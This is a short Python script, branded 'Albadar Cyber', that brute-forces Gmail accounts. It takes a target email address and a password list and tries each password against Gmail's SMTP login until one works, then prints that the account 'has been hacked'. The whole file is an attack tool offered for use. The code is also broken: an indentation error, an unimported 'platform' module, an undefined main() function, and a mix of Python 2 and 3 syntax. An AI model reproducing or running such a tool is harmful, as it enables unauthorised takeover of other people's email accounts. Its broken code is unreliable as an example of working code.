#!/usr/bin/python
import smtplib,os, sys, time, subprocess, socket, select, threading
from os import system
from platform import python_version
pv = python_version()

def slowaprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(7.0 / 90)

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2.0 / 90)
def clear():
    return os.system("cls") if (platform.system() == 'Windows') else os.system("clear")
clear()
slowprint ('='*45)
slowprint ('Welcome To Albadar Cyber')
slowprint ("Bruteforce Gmail")
slowprint ('='*45)
slowprint ("1. Attack Gnail")
slowprint ('2. Back To Menu')
slowprint ('='*45)
albadar = str(input("albadarcyber==> "))
if (albadar=='1') :
file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
